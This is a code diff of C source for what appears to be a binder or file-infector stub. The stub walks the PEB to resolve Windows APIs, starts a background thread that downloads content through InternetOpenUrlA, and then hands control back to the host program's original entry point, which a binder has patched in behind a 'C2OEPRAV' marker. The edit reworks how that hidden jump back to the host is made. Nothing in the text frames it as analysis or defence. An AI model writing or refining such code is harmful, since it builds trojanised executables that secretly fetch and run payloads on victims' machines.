@@ -30,10 +30,6 @@ typedef unsigned long long uptr;
 #define DBASE_INMEM 0x20  /* DllBase offset from an InMemoryOrderLinks node */
 #define DBASE_INLOAD 0x30 /* DllBase offset from an InLoadOrderLinks node   */
 #define EXPDIR_OFF 0x88   /* export data dir RVA field, from e_lfanew       */
-
-/* PE Header Offsets */
-#define LFANEW_OFF 0x3C    /* Pointer to NT Headers inside DOS Header */
-#define ENTRY_RVA_OFF 0x28 /* AddressOfEntryPoint inside NT/Optional Header */
 #else
 typedef unsigned long long uptr;
 #define PEB() ((uptr)__readfsdword(0x30))
@@ -43,8 +39,6 @@ typedef unsigned long long uptr;
 #define DBASE_INMEM 0x10
 #define DBASE_INLOAD 0x18
 #define EXPDIR_OFF 0x78
-#define LFANEW_OFF 0x3C    /* Pointer to NT Headers inside DOS Header */
-#define ENTRY_RVA_OFF 0x28 /* AddressOfEntryPoint inside NT/Optional Header */
 #endif
 
 typedef unsigned int u32;
@@ -201,26 +195,15 @@ __attribute__((section(".text.start"), used)) void _start(void)
     if (api.pCreateThread && api.pInternetOpenUrlA)
         api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, &api, 0, 0);
 
-    // 1. Walk PEB to get Image Base Address of host executable
-    uptr peb = (uptr)PEB();
+    /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
+    uptr peb = PEB();
     uptr ldr = *(uptr *)(peb + LDR_OFF);
-    uptr node = *(uptr *)(ldr + INLOAD_OFF);
-    uptr base = *(uptr *)(node + DBASE_INLOAD);
+    uptr first = *(uptr *)(ldr + INLOAD_OFF);
+    uptr base = *(uptr *)(first + DBASE_INLOAD);
+    volatile char c2_oep[12] = "C2OEPRAV"; /* volatile: prevent the -O2 constant-fold that erased this marker */
 
-    // 2. Read e_lfanew offset located at base + 0x3C
-    int e_lfanew = *(int *)(base + LFANEW_OFF);
-
-    // 3. NT Headers address = base + e_lfanew
-    uptr nt_headers = base + e_lfanew;
-
-    // 4. Read AddressOfEntryPoint (uint32_t RVA) at nt_headers + 0x28
-    int oep_rva = *(int *)(nt_headers + ENTRY_RVA_OFF);
-
-    // 5. Calculate absolute memory address of OEP
-    uptr oep_va = base + oep_rva;
-
-    // 6. Transfer control to true OEP
-    ((void (*)(void))oep_va)();
+    u32 oep = *(volatile u32 *)(c2_oep + 8); /* original entry-point RVA (patched by binder) */
+    ((void (*)(void))(base + oep))();
 
     for (;;)
     {
